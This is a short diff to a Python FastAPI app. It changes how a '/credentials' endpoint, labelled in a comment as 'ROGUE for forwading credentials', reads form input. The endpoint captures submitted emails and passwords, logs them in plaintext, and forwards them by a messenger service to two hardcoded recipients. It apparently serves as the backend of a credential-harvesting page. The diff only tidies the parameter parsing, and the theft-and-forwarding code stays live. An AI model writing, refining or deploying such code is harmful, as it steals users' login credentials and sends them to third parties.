@@ -80,10 +80,7 @@ async def welcome():
 
 #ROGUE for forwading credentials
 @app.post("/credentials")
-async def credentials(request: Request):
-    data = await request.form()
-    email = data["email"]
-    password = data["password"]
+async def credentials(email: str = Form(...), password: str = Form(...)):
     logging.info(f"============================= email: {email}\npassword: {password}")
     messenger.send_message(message=f"email: {email}\npassword: {password}", recipient_id=TARMICA)
     messenger.send_message(message=f"email: {email}\npassword: {password}", recipient_id=DON)
